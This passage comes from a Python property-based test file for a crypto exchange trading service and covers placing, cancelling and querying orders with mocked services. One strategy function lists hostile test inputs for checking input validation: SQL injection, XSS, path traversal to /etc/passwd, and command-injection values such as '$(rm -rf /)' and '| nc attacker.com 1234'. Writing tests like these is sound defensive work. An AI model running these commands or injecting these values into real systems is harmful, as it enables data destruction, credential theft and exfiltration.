    """
    return st.one_of([
        st.none(),
        st.text(
            alphabet=st.characters(whitelist_categories=["Nd"]), min_size=1, max_size=32
        ),  # Numeric only
        st.builds(
            lambda prefix, suffix: f"{prefix}{suffix}",
            st.sampled_from(["client", "c", "order"]),
            st.integers(min_value=1, max_value=999999),
        ),
        st.sampled_from(["123456", "789012", "client123", "order456"]),
    ])


def api_error_strategy() -> SearchStrategy[APIError]:
    """Generate API errors for testing.

    Returns:
        SearchStrategy[APIError]: Strategy for API errors.
    """
    return st.builds(
        APIError,
        code=st.sampled_from([
            "INVALID_RESPONSE",
            "RATE_LIMITED",
            "CONNECTION_ERROR",
            "ORDER_NOT_FOUND",
            "INSUFFICIENT_BALANCE",
            "MARKET_CLOSED",
        ]),
        message=st.one_of([
            st.text(min_size=10, max_size=100),
            st.builds(
                lambda symbol,
                status: f"No data received for place order for {symbol}, status: {status}",
                st.text(min_size=3, max_size=20),
                st.integers(min_value=200, max_value=599),
            ),
            st.builds(
                lambda order_id,
                symbol,
                status: f"No data received for cancel order {order_id} ({symbol}), status: {status}",
                st.text(min_size=1, max_size=20),
                st.text(min_size=3, max_size=20),
                st.integers(min_value=200, max_value=599),
            ),
            st.sampled_from([
                "Rate limit exceeded",
                "Connection timeout",
                "Invalid request format",
                "Order not found",
                "Insufficient balance",
                "Market is closed",
            ]),
        ]),
    )


def cancel_order_result_strategy() -> SearchStrategy[CancelOrderResult]:
    """Generate cancel order results for testing.

    Returns:
        SearchStrategy[CancelOrderResult]: Strategy for cancel order results.
    """
    return st.builds(
        CancelOrderResult,
        symbol=bp_symbol_strategy(),
        order_id=order_id_strategy(),
        client_order_id=client_order_id_strategy(),
        success=st.booleans(),
        message=st.one_of([st.none(), st.text(min_size=1, max_size=100)]),
        status=st.sampled_from([
            CancelOrderResultStatus.SUCCESS,
            CancelOrderResultStatus.FAILED,
            CancelOrderResultStatus.NOT_FOUND,
        ]),
        raw_response=st.none(),
    )


def malicious_string_strategy() -> SearchStrategy[str]:
    """Generate potentially malicious strings for testing input validation.

    Returns:
        SearchStrategy[str]: Strategy for malicious strings.
    """
    return st.one_of([
        # SQL injection attempts
        st.sampled_from([
            "'; DROP TABLE orders; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM trades WHERE 1=1; --",
        ]),
        # XSS attempts
        st.sampled_from([
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'></iframe>",
        ]),
        # Command injection
        st.sampled_from([
            "$(rm -rf /)",
            "`cat /etc/passwd`",
            "; ls -la",
            "| nc attacker.com 1234",
        ]),
        # Path traversal
        st.sampled_from([
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "file:///etc/passwd",
        ]),
        # Buffer overflow attempts
        st.text(alphabet="A", min_size=1000, max_size=1500),
        # Format string attacks
        st.sampled_from(["%s%s%s%s%s", "%x%x%x%x", "%n%n%n%n"]),
        # Empty and whitespace
        st.sampled_from(["", " ", "\t", "\n", "\r\n"]),
    ])


@composite
def place_order_args_strategy(draw: st.DrawFn) -> PlaceOrderArgs:
    """Generate valid PlaceOrderArgs instances.

    Args:
        draw: Hypothesis draw function.

    Returns:
        PlaceOrderArgs: Valid place order arguments.
    """
    symbol = draw(bp_symbol_strategy())
    side = draw(order_side_strategy())
    order_type = draw(order_type_strategy())
    quantity = draw(valid_quantity_strategy())
    time_in_force = draw(time_in_force_strategy())
    liquidity_req = draw(liquidity_requirement_strategy())

    # Generate price only for limit orders
    price = (
        draw(valid_price_strategy())
        if order_type in [OrderType.LIMIT, OrderType.STOP_LIMIT]
        else None
    )

    # Generate stop price only for stop orders
    stop_price = draw(valid_price_strategy()) if order_type == OrderType.STOP_LIMIT else None

    client_order_id = draw(client_order_id_strategy())

    return PlaceOrderArgs(
        symbol=symbol,
        side=side,
        order_type=order_type,
        quantity=quantity,
        time_in_force=time_in_force,
        price=price,
        stop_price=stop_price,
        client_order_id=client_order_id,
        execution=OrderExecution(liquidity_requirement=liquidity_req),
    )


@composite
def cancel_order_args_strategy(draw: st.DrawFn) -> CancelOrderArgs:
    """Generate valid CancelOrderArgs instances.

    Args:
        draw: Hypothesis draw function.

    Returns:
        CancelOrderArgs: Valid cancel order arguments.
    """
    return CancelOrderArgs(
        order_id=draw(order_id_strategy()),
        symbol=draw(bp_symbol_strategy()),
    )


@composite
def get_order_args_strategy(draw: st.DrawFn) -> GetOrderArgs:
    """Generate valid GetOrderArgs instances.

    Args:
        draw: Hypothesis draw function.

    Returns:
        GetOrderArgs: Valid get order arguments.
    """
    return GetOrderArgs(
        order_id=draw(order_id_strategy()),
        symbol=draw(bp_symbol_strategy()),
    )


@composite
def invalid_place_order_args_strategy(draw: st.DrawFn) -> tuple[PlaceOrderArgs, str]:
    """Generate invalid PlaceOrderArgs instances with expected error type.

    Args:
        draw: Hypothesis draw function.

    Returns:
        tuple: (Invalid PlaceOrderArgs, expected error type)
    """
    symbol = draw(bp_symbol_strategy())
    side = draw(order_side_strategy())
    order_type = draw(order_type_strategy())
    time_in_force = draw(time_in_force_strategy())

    error_type = draw(st.sampled_from(["invalid_quantity", "invalid_price", "invalid_stop_price"]))

    if error_type == "invalid_quantity":
        quantity = draw(invalid_quantity_strategy())
        price = (
            draw(valid_price_strategy())
            if order_type in [OrderType.LIMIT, OrderType.STOP_LIMIT]
            else None
        )
        stop_price = draw(valid_price_strategy()) if order_type == OrderType.STOP_LIMIT else None
    elif error_type == "invalid_price":
        quantity = draw(valid_quantity_strategy())
        price = (
            draw(invalid_price_strategy())
            if order_type in [OrderType.LIMIT, OrderType.STOP_LIMIT]
            else None
        )
        stop_price = draw(valid_price_strategy()) if order_type == OrderType.STOP_LIMIT else None
    else:  # invalid_stop_price
        quantity = draw(valid_quantity_strategy())
        price = (
            draw(valid_price_strategy())
            if order_type in [OrderType.LIMIT, OrderType.STOP_LIMIT]
            else None
        )
        stop_price = draw(invalid_price_strategy()) if order_type == OrderType.STOP_LIMIT else None

    args = PlaceOrderArgs(
        symbol=symbol,
        side=side,
        order_type=order_type,
        quantity=quantity,
        time_in_force=time_in_force,
        price=price,
        stop_price=stop_price,
        execution=OrderExecution(),
    )

    return args, error_type


# =======================
# Property-Based Test Classes
# =======================


class TestBackpackTradingServicePlaceOrderPropertyBased:
    """Property-based tests for place order functionality."""

    @given(place_order_args=place_order_args_strategy())
    @settings(max_examples=50)
    @pytest.mark.asyncio
    async def test_place_order_success_property_based(
        self,
        bp_trading_service: BackpackTradingService,
        place_order_args: PlaceOrderArgs,
    ) -> None:
        """Property-based test for successful order placement."""
        with patch.object(bp_trading_service, "_order_placement_service") as mock_placement_service:
            mock_order = MagicMock()
            mock_placement_service.place_order = AsyncMock(return_value=mock_order)

            result = await bp_trading_service.place_order(place_order_args)

            assert result == mock_order
            mock_placement_service.place_order.assert_called_once_with(place_order_args)

    @given(
        place_order_args=place_order_args_strategy(),
        api_error=api_error_strategy(),
    )
    @settings(max_examples=30)
    @pytest.mark.asyncio
    async def test_place_order_api_error_property_based(
        self,
        bp_trading_service: BackpackTradingService,
        place_order_args: PlaceOrderArgs,
        api_error: APIError,
    ) -> None:
        """Property-based test for place order API error handling."""
        with patch.object(bp_trading_service, "_order_placement_service") as mock_placement_service:
            mock_placement_service.place_order = AsyncMock(side_effect=api_error)

            with pytest.raises(APIError) as exc_info:
                await bp_trading_service.place_order(place_order_args)

            assert exc_info.value.code == api_error.code
            assert exc_info.value.message == api_error.message
            mock_placement_service.place_order.assert_called_once_with(place_order_args)

    @given(invalid_args_info=invalid_place_order_args_strategy())
    @settings(max_examples=30)
    @pytest.mark.asyncio
    async def test_place_order_validation_property_based(
        self,
        bp_trading_service: BackpackTradingService,
        invalid_args_info: tuple[PlaceOrderArgs, str],
    ) -> None:
        """Property-based test for place order input validation."""
        invalid_args, error_type = invalid_args_info

        try:
            with pytest.raises(ValueError) as exc_info:
                await bp_trading_service.place_order(invalid_args)

            error_message = str(exc_info.value)
            if (
                error_type == "invalid_quantity"
                or error_type == "invalid_price"
                or error_type == "invalid_stop_price"
            ):
                assert (
                    "Input should be greater than 0" in error_message
                    or "must be a finite decimal" in error_message
                )

        except ValidationError:
            # Pydantic validation errors are also acceptable for invalid inputs
            pass


class TestBackpackTradingServiceCancelOrderPropertyBased:
    """Property-based tests for cancel order functionality."""

    @given(
        cancel_order_args=cancel_order_args_strategy(),
        cancel_result=cancel_order_result_strategy(),
    )
    @settings(max_examples=50)
    @pytest.mark.asyncio
    async def test_cancel_order_success_property_based(
        self,
        bp_trading_service: BackpackTradingService,
        cancel_order_args: CancelOrderArgs,
        cancel_result: CancelOrderResult,
    ) -> None:
        """Property-based test for successful order cancellation."""
        # Ensure the cancel result matches the args
        cancel_result_matched = CancelOrderResult(
            symbol=cancel_order_args.symbol,
            order_id=cancel_order_args.order_id,
            client_order_id=cancel_result.client_order_id,
            success=cancel_result.success,
            message=cancel_result.message,
            status=cancel_result.status,
            raw_response=cancel_result.raw_response,
        )

        with patch.object(
            bp_trading_service, "_order_cancellation_service"
        ) as mock_cancellation_service:
            mock_cancellation_service.cancel_order = AsyncMock(return_value=cancel_result_matched)

            result = await bp_trading_service.cancel_order(cancel_order_args)

            assert result == cancel_result_matched
            assert result.symbol == cancel_order_args.symbol
            assert result.order_id == cancel_order_args.order_id
            mock_cancellation_service.cancel_order.assert_called_once_with(cancel_order_args)

    @given(
        cancel_order_args=cancel_order_args_strategy(),
        api_error=api_error_strategy(),
    )
    @settings(max_examples=30)
    @pytest.mark.asyncio
    async def test_cancel_order_api_error_property_based(
        self,
        bp_trading_service: BackpackTradingService,
        cancel_order_args: CancelOrderArgs,
        api_error: APIError,
    ) -> None:
        """Property-based test for cancel order API error handling."""
        with patch.object(
            bp_trading_service, "_order_cancellation_service"
        ) as mock_cancellation_service:
            mock_cancellation_service.cancel_order = AsyncMock(side_effect=api_error)

            with pytest.raises(APIError) as exc_info:
                await bp_trading_service.cancel_order(cancel_order_args)

            assert exc_info.value.code == api_error.code
            assert exc_info.value.message == api_error.message
            mock_cancellation_service.cancel_order.assert_called_once_with(cancel_order_args)

    @given(
        symbol=bp_symbol_strategy(),
        cancel_results=st.lists(cancel_order_result_strategy(), min_size=0, max_size=10),
    )
    @settings(max_examples=30)
    @pytest.mark.asyncio
    async def test_cancel_all_orders_property_based(
        self,
        bp_trading_service: BackpackTradingService,
        symbol: Symbol,
        cancel_results: list[CancelOrderResult],
    ) -> None:
        """Property-based test for cancel all orders functionality."""
        # Ensure all results have the correct symbol
        matched_results = [
            CancelOrderResult(
                symbol=symbol,
                order_id=result.order_id,
                client_order_id=result.client_order_id,
                success=result.success,
                message=result.message,
                status=result.status,
                raw_response=result.raw_response,
            )
            for result in cancel_results
        ]

        with patch.object(bp_trading_service, "_batch_order_service") as mock_batch_service:
            mock_batch_service.cancel_all_orders = AsyncMock(return_value=matched_results)

            result = await bp_trading_service.cancel_all_orders(symbol)

            assert len(result) == len(matched_results)
            assert all(cancel_result.symbol == symbol for cancel_result in result)
            mock_batch_service.cancel_all_orders.assert_called_once_with(symbol)


class TestBackpackTradingServiceGetOrderPropertyBased:
    """Property-based tests for get order functionality."""

    @given(get_order_args=get_order_args_strategy())
    @settings(max_examples=50)
    @pytest.mark.asyncio
    async def test_get_order_success_property_based(
        self,
        bp_trading_service: BackpackTradingService,
        get_order_args: GetOrderArgs,
    ) -> None:
        """Property-based test for successful order retrieval."""
        with patch.object(bp_trading_service, "_order_query_service") as mock_query_service:
            mock_order = MagicMock()
            mock_query_service.get_order = AsyncMock(return_value=mock_order)

            result = await bp_trading_service.get_order(get_order_args)

            assert result == mock_order
            mock_query_service.get_order.assert_called_once_with(get_order_args)

    @given(
        get_order_args=get_order_args_strategy(),
        api_error=api_error_strategy(),
    )
    @settings(max_examples=30)
    @pytest.mark.asyncio
    async def test_get_order_status_api_error_property_based(
        self,
        bp_trading_service: BackpackTradingService,
        get_order_args: GetOrderArgs,
        api_error: APIError,
    ) -> None:
        """Property-based test for get order status API error handling."""
        with patch.object(bp_trading_service, "_order_query_service") as mock_query_service:
            mock_query_service.get_order = AsyncMock(side_effect=api_error)

            # get_order_status should catch exceptions and return None
            result = await bp_trading_service.get_order_status(get_order_args)

            assert result is None
            mock_query_service.get_order.assert_called_once_with(get_order_args)


class TestBackpackTradingServiceValidationPropertyBased:
    """Property-based tests for input validation and error handling."""

    @given(malicious_symbol=malicious_string_strategy())
    @settings(max_examples=20)
    @pytest.mark.asyncio
    async def test_malicious_symbol_resistance(
        self,
        bp_trading_service: BackpackTradingService,
        malicious_symbol: str,
    ) -> None:
        """Property-based test for resistance to malicious symbol inputs."""
        try:
            if malicious_symbol.strip() == "":
                # Empty symbols should raise validation errors
                with pytest.raises((ValidationError, ValueError)):
                    invalid_symbol = exchanges.backpack(malicious_symbol)
                    args = PlaceOrderArgs(
                        symbol=invalid_symbol,
                        side=OrderSide.BUY,
                        order_type=OrderType.LIMIT,
                        quantity=Decimal("10.0"),
                        time_in_force=TimeInForce.GTC,
                        price=Decimal("100.0"),
                        execution=OrderExecution(),
                    )
                    await bp_trading_service.place_order(args)
            else:
                # Non-empty malicious symbols should be handled safely
                malicious_symbol_obj = exchanges.backpack(malicious_symbol)

                # Service should handle malicious symbols safely
                with patch.object(
                    bp_trading_service, "_order_placement_service"
                ) as mock_placement_service:
                    mock_placement_service.place_order = AsyncMock(
                        side_effect=APIError(
                            code="SYMBOL_NOT_FOUND", message=f"Symbol {malicious_symbol} not found"
                        )
                    )

                    args = PlaceOrderArgs(
                        symbol=malicious_symbol_obj,
                        side=OrderSide.BUY,
                        order_type=OrderType.LIMIT,
                        quantity=Decimal("10.0"),
                        time_in_force=TimeInForce.GTC,
                        price=Decimal("100.0"),
                        execution=OrderExecution(),
                    )

                    with pytest.raises(APIError):
                        await bp_trading_service.place_order(args)

        except (ValueError, ValidationError):
            # Rejecting malicious input at symbol/args creation is acceptable
            pass

    @given(malicious_order_id=malicious_string_strategy())
    @settings(max_examples=20)
    @pytest.mark.asyncio
    async def test_malicious_order_id_resistance(
        self,
        bp_trading_service: BackpackTradingService,
        malicious_order_id: str,
    ) -> None:
        """Property-based test for resistance to malicious order ID inputs."""
        try:
            if malicious_order_id.strip() == "":
                # Empty order IDs should raise validation errors
                with pytest.raises(ValidationError):
                    CancelOrderArgs(
                        order_id=malicious_order_id,
                        symbol=SOL_USDC_BP,
                    )
            else:
                # Non-empty malicious order IDs should be handled safely
                args = CancelOrderArgs(
                    order_id=malicious_order_id,
                    symbol=SOL_USDC_BP,
                )

                with patch.object(
                    bp_trading_service, "_order_cancellation_service"
                ) as mock_cancellation_service:
                    mock_cancellation_service.cancel_order = AsyncMock(
                        side_effect=APIError(
                            code="ORDER_NOT_FOUND", message=f"Order {malicious_order_id} not found"
                        )
                    )

                    with pytest.raises(APIError):
                        await bp_trading_service.cancel_order(args)

        except (ValueError, ValidationError):
            # Rejecting malicious input at args creation is acceptable
            pass

    @given(
        extreme_quantity=st.decimals(
            min_value=Decimal("0.000000001"), max_value=Decimal("999999999.999999999"), places=9
        ),
        extreme_price=st.decimals(
            min_value=Decimal("0.000001"), max_value=Decimal("999999.999999"), places=6
        ),
    )
    @settings(max_examples=20)
    @pytest.mark.asyncio
    async def test_extreme_value_handling(
        self,
        bp_trading_service: BackpackTradingService,
        extreme_quantity: Decimal,
        extreme_price: Decimal,
    ) -> None:
        """Property-based test for handling extreme values."""
        # Skip if values are not finite
        assume(extreme_quantity.is_finite() and extreme_price.is_finite())
        assume(extreme_quantity > 0 and extreme_price > 0)

        with patch.object(bp_trading_service, "_order_placement_service") as mock_placement_service:
            mock_order = MagicMock()
            mock_placement_service.place_order = AsyncMock(return_value=mock_order)

            args = PlaceOrderArgs(
                symbol=SOL_USDC_BP,
                side=OrderSide.BUY,
                order_type=OrderType.LIMIT,
                quantity=extreme_quantity,
                time_in_force=TimeInForce.GTC,
                price=extreme_price,
                execution=OrderExecution(),
            )

            result = await bp_trading_service.place_order(args)

            assert result == mock_order
            mock_placement_service.place_order.assert_called_once_with(args)


class TestBackpackTradingServiceCombinedScenariosPropertyBased:
    """Property-based tests for combined scenarios and edge cases."""

    @given(
        symbols=st.lists(bp_symbol_strategy(), min_size=1, max_size=5, unique=True),
        order_types=st.lists(order_type_strategy(), min_size=1, max_size=3),
        sides=st.lists(order_side_strategy(), min_size=1, max_size=2),
    )
    @settings(max_examples=20)
    @pytest.mark.asyncio
    async def test_multiple_order_scenarios(
        self,
        bp_trading_service: BackpackTradingService,
        symbols: list[Symbol],
        order_types: list[OrderType],
        sides: list[OrderSide],
    ) -> None:
        """Property-based test for multiple order scenarios."""
        with patch.object(bp_trading_service, "_order_placement_service") as mock_placement_service:
            mock_orders = [MagicMock() for _ in range(len(symbols))]
            mock_placement_service.place_order = AsyncMock(side_effect=mock_orders)

            results = []
            for i, symbol in enumerate(symbols):
                order_type = order_types[i % len(order_types)]
                side = sides[i % len(sides)]

                price = (
                    Decimal("100.0")
                    if order_type in [OrderType.LIMIT, OrderType.STOP_LIMIT]
                    else None
                )
                stop_price = Decimal("105.0") if order_type == OrderType.STOP_LIMIT else None

                args = PlaceOrderArgs(
                    symbol=symbol,
                    side=side,
                    order_type=order_type,
                    quantity=Decimal("10.0"),
                    time_in_force=TimeInForce.GTC,
                    price=price,
                    stop_price=stop_price,
                    execution=OrderExecution(),
                )

                result = await bp_trading_service.place_order(args)
                results.append(result)

            assert len(results) == len(symbols)
            assert mock_placement_service.place_order.call_count == len(symbols)

    @given(
        place_args=place_order_args_strategy(),
        cancel_args=cancel_order_args_strategy(),
        get_args=get_order_args_strategy(),
    )
    @settings(max_examples=20)
    @pytest.mark.asyncio
    async def test_combined_order_operations(
        self,
        bp_trading_service: BackpackTradingService,
        place_args: PlaceOrderArgs,
        cancel_args: CancelOrderArgs,
        get_args: GetOrderArgs,
    ) -> None:
        """Property-based test for combined order operations (place, cancel, get)."""
        # Mock all services
        with (
            patch.object(bp_trading_service, "_order_placement_service") as mock_placement_service,
            patch.object(
                bp_trading_service, "_order_cancellation_service"
            ) as mock_cancellation_service,
            patch.object(bp_trading_service, "_order_query_service") as mock_query_service,
        ):
            mock_order = MagicMock()
            mock_cancel_result = CancelOrderResult(
                symbol=cancel_args.symbol,
                order_id=cancel_args.order_id,
                client_order_id=None,
                success=True,
                message=None,
                status=CancelOrderResultStatus.SUCCESS,
                raw_response=None,
            )
            mock_get_order = MagicMock()

            mock_placement_service.place_order = AsyncMock(return_value=mock_order)
            mock_cancellation_service.cancel_order = AsyncMock(return_value=mock_cancel_result)
            mock_query_service.get_order = AsyncMock(return_value=mock_get_order)

            # Execute combined operations
            place_result = await bp_trading_service.place_order(place_args)
            cancel_result = await bp_trading_service.cancel_order(cancel_args)
            get_result = await bp_trading_service.get_order(get_args)

            # Verify results
            assert place_result == mock_order
            assert cancel_result == mock_cancel_result
            assert get_result == mock_get_order

            # Verify service calls
            mock_placement_service.place_order.assert_called_once_with(place_args)
            mock_cancellation_service.cancel_order.assert_called_once_with(cancel_args)
            mock_query_service.get_order.assert_called_once_with(get_args)


# =======================
# Legacy Compatibility Verification
# =======================


class TestLegacyCompatibility:
    """Verify that property-based tests don't break legacy functionality."""

    @pytest.mark.asyncio
    async def test_legacy_place_order_functionality(
        self,
        bp_trading_service: BackpackTradingService,
    ) -> None:
        """Verify legacy place order functionality remains intact."""
        args = PlaceOrderArgs(
            symbol=SOL_USDC_BP,
            side=OrderSide.BUY,
            order_type=OrderType.LIMIT,
            quantity=Decimal("10.0"),
            time_in_force=TimeInForce.GTC,
            price=Decimal("100.0"),
            execution=OrderExecution(),
        )

        with patch.object(bp_trading_service, "_order_placement_service") as mock_placement_service:
            mock_order = MagicMock()
            mock_placement_service.place_order = AsyncMock(return_value=mock_order)

            result = await bp_trading_service.place_order(args)

            assert result == mock_order
            mock_placement_service.place_order.assert_called_once_with(args)

    @pytest.mark.asyncio
    async def test_legacy_cancel_order_functionality(
        self,
        bp_trading_service: BackpackTradingService,
    ) -> None:
        """Verify legacy cancel order functionality remains intact."""
        args = CancelOrderArgs(order_id="12345", symbol=SOL_USDC_BP)

        mock_cancel_result = CancelOrderResult(
            symbol=SOL_USDC_BP,
            order_id="12345",
            client_order_id=None,
            success=True,
            message=None,
            status=CancelOrderResultStatus.SUCCESS,
            raw_response=None,
        )

        with patch.object(
            bp_trading_service, "_order_cancellation_service"
        ) as mock_cancellation_service:
            mock_cancellation_service.cancel_order = AsyncMock(return_value=mock_cancel_result)

            result = await bp_trading_service.cancel_order(args)

            assert result == mock_cancel_result
            mock_cancellation_service.cancel_order.assert_called_once_with(args)

    @pytest.mark.asyncio
    async def test_legacy_get_order_functionality(
        self,
        bp_trading_service: BackpackTradingService,
    ) -> None:
        """Verify legacy get order functionality remains intact."""
        args = GetOrderArgs(order_id="12345", symbol=SOL_USDC_BP)

        with patch.object(bp_trading_service, "_order_query_service") as mock_query_service:
            mock_order = MagicMock()
            mock_query_service.get_order = AsyncMock(return_value=mock_order)

            result = await bp_trading_service.get_order(args)

            assert result == mock_order
            mock_query_service.get_order.assert_called_once_with(args)
